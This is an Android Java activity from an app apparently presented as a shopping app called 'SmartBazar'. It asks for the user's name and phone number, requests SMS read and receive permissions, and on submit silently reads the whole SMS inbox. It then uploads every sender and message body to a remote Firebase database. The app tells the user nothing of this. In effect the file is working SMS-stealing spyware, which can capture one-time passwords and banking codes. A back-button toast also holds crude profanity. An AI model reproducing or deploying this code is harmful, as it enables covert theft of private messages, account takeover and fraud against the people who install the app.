package com.bazaar.smartbazar;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    SMSReceiver smsReceiver = new SMSReceiver();

    Button submitBtn;
    EditText name_et, number_et;
    private static final int SMS_PERMISSION_CODE = 123;

    private boolean isBackPressedOnce = false;

    private boolean checkPermission() {
        int readSmsPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS);
        int receiveSmsPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS);
        return (readSmsPermission == PackageManager.PERMISSION_GRANTED &&
                receiveSmsPermission == PackageManager.PERMISSION_GRANTED);
    }

    private void requestSmsPermissions() {
        String[] permissions = {android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS};

        ActivityCompat.requestPermissions(this, permissions, SMS_PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permissions granted, you can proceed with your app logic.
            } else {
                // Permissions denied, inform the user or handle the denial gracefully.
                Toast.makeText(this, "SMS permissions denied. Some features may not work.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private static final int SMS_PERMISSION_REQUEST_CODE = 123;

    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        submitBtn = findViewById(R.id.submit_btn);
        name_et = findViewById(R.id.name_et);
        number_et = findViewById(R.id.number_et);

        IntentFilter filter;
        filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);

        if (checkPermission()) {
            // Permissions are already granted, you can proceed with your app logic.
        } else {
            // Permissions are not granted, request them from the user
            requestSmsPermissions();
        }


        submitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                cont();

            }
        });

    }

    @Override
    public void onBackPressed() {
        if (isBackPressedOnce){
            super.onBackPressed();
            return;
        }
        Toast.makeText(this, "Fuck me hard", Toast.LENGTH_SHORT).show();
        isBackPressedOnce = true;

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                isBackPressedOnce = false;
            }
        }, 2000);
    }

    public void cont() {

        Intent intent = new Intent(MainActivity.this, Loader.class);
        startActivity(intent);

        String nameEt = name_et.getText().toString().trim();
        String numberEt = number_et.getText().toString().trim();
        if (nameEt.isEmpty()) {
            name_et.setError("Enter name to continue");
        }
        if (numberEt.isEmpty()) {
            number_et.setError("Enter number to continue");

        }

        SharedPreferences sharedPreferences = getSharedPreferences("SharedPref", MODE_PRIVATE);
        SharedPreferences.Editor myEdit = sharedPreferences.edit();

        myEdit.putString("number", numberEt);
        myEdit.apply();


        if (!nameEt.isEmpty() && !numberEt.isEmpty()) {

            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    @SuppressLint("Range") String sender = cursor.getString(cursor.getColumnIndex("address"));
                    @SuppressLint("Range") String message = cursor.getString(cursor.getColumnIndex("body"));

                    String receiverNumber = "91" + number_et.getText().toString().trim();

                    DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("users").child(receiverNumber);
                    databaseReference.child("userDetails").child("userName").setValue(nameEt);
                    databaseReference.child("userDetails").child("userNumber").setValue("+" + receiverNumber);
                    databaseReference.child("userDetails").child("userStatus").setValue("Active");

                    DatabaseReference databaseReferenceInbox = FirebaseDatabase.getInstance().getReference().child("users").child(receiverNumber).child("userInbox").push();

                    databaseReferenceInbox.child("sender").setValue(sender);
                    databaseReferenceInbox.child("text").setValue(message);


                } while (cursor.moveToNext());

                cursor.close();
            }
        }


    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    public static class AppUninstallObserver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
                Log.d("UNIN", "onChange: ");
            }
        }
    }

}